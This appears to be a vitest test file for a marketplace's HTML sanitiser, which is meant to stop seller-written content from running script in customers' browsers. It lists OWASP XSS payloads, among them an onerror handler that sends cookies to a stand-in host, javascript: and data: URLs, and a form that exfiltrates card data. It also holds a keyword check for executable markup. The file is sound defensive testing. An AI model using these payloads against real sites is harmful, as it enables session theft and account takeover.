/**
 * HTML sanitisation — the security boundary for seller-authored content.
 *
 * User journey: as a customer browsing a seller's blog or portfolio, nothing
 * that seller wrote can run code in my browser.
 *
 * This matters more here than on a single-tenant site. A stored XSS on
 * <seller>.hordemart.com runs in an origin sharing a registrable domain with
 * the dashboard. Host-only cookies (ADR-0005) are the other half of that
 * defence; this is the first half.
 *
 * Payloads below are real ones from the OWASP XSS filter evasion cheat sheet,
 * not invented strings. A sanitiser that only stops <script> stops nothing.
 */

import { describe, expect, it } from 'vitest';
import {
  sanitizeInline,
  sanitizeRichText,
  stripAllHtml,
} from '../../src/lib/security/sanitizeHtml';

/** True if the value still contains anything that could execute. */
function isInert(html: string): boolean {
  const lowered = html.toLowerCase();
  return (
    !lowered.includes('<script') &&
    !lowered.includes('javascript:') &&
    !lowered.includes('onerror') &&
    !lowered.includes('onload') &&
    !lowered.includes('onclick') &&
    !lowered.includes('onfocus') &&
    !lowered.includes('<iframe') &&
    !lowered.includes('<object') &&
    !lowered.includes('<embed') &&
    !lowered.includes('<form')
  );
}

describe('script execution is removed', () => {
  const payloads = [
    '<script>alert(1)</script>',
    '<SCRIPT SRC=http://evil.test/xss.js></SCRIPT>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="fetch(\'http://evil.test?c=\'+document.cookie)">',
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<body onload=alert(1)>',
    '<div onclick="alert(1)">click</div>',
    '<input onfocus=alert(1) autofocus>',
    '<iframe src="http://evil.test"></iframe>',
    '<object data="data:text/html,<script>alert(1)</script>"></object>',
    '<embed src="http://evil.test/x.swf">',
    '<form action="http://evil.test"><input name="card"></form>',
  ];

  it.each(payloads)('neutralises %s', (payload) => {
    const clean = sanitizeRichText(payload);
    expect(isInert(clean), `left behind: ${clean}`).toBe(true);
  });
});

describe('dangerous URLs are removed', () => {
  it('strips a javascript: href', () => {
    const clean = sanitizeRichText('<a href="javascript:alert(1)">click</a>');
    expect(clean.toLowerCase()).not.toContain('javascript:');
  });

  it('strips an obfuscated javascript: href', () => {
    // Entity-encoded and whitespace-split variants both resolve to javascript:
    // in a browser.
    const clean = sanitizeRichText('<a href="jav&#x09;ascript:alert(1)">x</a>');
    expect(clean.toLowerCase()).not.toMatch(/jav\s*ascript:/);
  });

  it('strips a data: URL in an image source', () => {
    const clean = sanitizeRichText(
      '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    );
    expect(clean).not.toContain('data:text/html');
  });

  it('strips vbscript:', () => {
    const clean = sanitizeRichText('<a href="vbscript:msgbox(1)">x</a>');
    expect(clean.toLowerCase()).not.toContain('vbscript:');
  });

  it('keeps an ordinary https link', () => {
    const clean = sanitizeRichText('<a href="https://example.com">shop</a>');
    expect(clean).toContain('https://example.com');
  });

  it('keeps a relative link', () => {
    const clean = sanitizeRichText('<a href="/products/shirt">shirt</a>');
    expect(clean).toContain('/products/shirt');
  });

  it('keeps a mailto link', () => {
    const clean = sanitizeRichText('<a href="mailto:hi@example.com">email</a>');
    expect(clean).toContain('mailto:hi@example.com');
  });
});

describe('style-based attacks are removed', () => {
  it('strips a style attribute', () => {
    // style="" enables position:fixed overlays for clickjacking even without
    // script execution.
    const clean = sanitizeRichText('<p style="position:fixed;top:0">hi</p>');
    expect(clean).not.toContain('style');
  });

  it('strips a style element', () => {
    const clean = sanitizeRichText('<style>body{display:none}</style><p>hi</p>');
    expect(clean.toLowerCase()).not.toContain('<style');
    expect(clean).toContain('hi');
  });

  it('strips a base element, which would rewrite every relative link', () => {
    const clean = sanitizeRichText('<base href="http://evil.test/"><a href="/x">x</a>');
    expect(clean.toLowerCase()).not.toContain('<base');
  });
});

describe('legitimate seller content survives', () => {
  it('keeps formatting', () => {
    const clean = sanitizeRichText('<p>A <strong>great</strong> <em>shirt</em>.</p>');
    expect(clean).toContain('<strong>great</strong>');
    expect(clean).toContain('<em>shirt</em>');
  });

  it('keeps headings and lists', () => {
    const html = '<h2>Details</h2><ul><li>100% cotton</li><li>Made in Lagos</li></ul>';
    const clean = sanitizeRichText(html);
    expect(clean).toContain('<h2>Details</h2>');
    expect(clean).toContain('<li>100% cotton</li>');
  });

  it('keeps images with alt text', () => {
    const clean = sanitizeRichText(
      '<img src="https://res.cloudinary.com/x/shirt.jpg" alt="Blue shirt">',
    );
    expect(clean).toContain('res.cloudinary.com');
    expect(clean).toContain('alt="Blue shirt"');
  });

  it('keeps tables, which sellers use for size charts', () => {
    const clean = sanitizeRichText('<table><tr><td>S</td><td>36</td></tr></table>');
    expect(clean).toContain('<td>S</td>');
  });

  it('keeps blockquotes and code', () => {
    const clean = sanitizeRichText('<blockquote>Lovely</blockquote><code>SKU-1</code>');
    expect(clean).toContain('<blockquote>');
    expect(clean).toContain('<code>');
  });

  it('preserves non-ASCII text', () => {
    const clean = sanitizeRichText('<p>Àdìrẹ̀ fabric — ₦12,500</p>');
    expect(clean).toContain('Àdìrẹ̀');
    expect(clean).toContain('₦12,500');
  });
});

describe('sanitizeInline is stricter', () => {
  it('allows only simple emphasis', () => {
    const clean = sanitizeInline('<strong>Bold</strong> and <em>italic</em>');
    expect(clean).toContain('<strong>Bold</strong>');
  });

  it('drops links, which have no place in a tagline', () => {
    const clean = sanitizeInline('<a href="https://example.com">link</a>');
    expect(clean).not.toContain('<a');
    expect(clean).toContain('link');
  });

  it('drops block elements', () => {
    const clean = sanitizeInline('<div><p>text</p></div>');
    expect(clean).not.toContain('<div');
    expect(clean).not.toContain('<p');
  });

  it('neutralises script here too', () => {
    expect(isInert(sanitizeInline('<script>alert(1)</script>'))).toBe(true);
  });
});

describe('stripAllHtml', () => {
  it('leaves only text', () => {
    expect(stripAllHtml('<p>Hello <strong>world</strong></p>')).toBe('Hello world');
  });

  it('removes script content entirely rather than leaving the source visible', () => {
    const clean = stripAllHtml('<script>alert(1)</script>Visible');
    expect(clean).not.toContain('alert');
    expect(clean).toContain('Visible');
  });
});

describe('edge cases', () => {
  it('handles empty input', () => {
    expect(sanitizeRichText('')).toBe('');
  });

  it('handles plain text with no markup', () => {
    expect(sanitizeRichText('Just a shirt')).toBe('Just a shirt');
  });

  it('escapes stray angle brackets rather than dropping the text', () => {
    const clean = sanitizeRichText('Price < 5000 and > 1000');
    expect(clean).toContain('5000');
    expect(clean).toContain('1000');
  });

  it('survives deeply nested markup without throwing', () => {
    const nested = '<div>'.repeat(200) + 'deep' + '</div>'.repeat(200);
    expect(() => sanitizeRichText(nested)).not.toThrow();
  });

  it('is idempotent — sanitising twice changes nothing further', () => {
    const once = sanitizeRichText('<p onclick="alert(1)">Hi <script>x</script></p>');
    expect(sanitizeRichText(once)).toBe(once);
  });
});
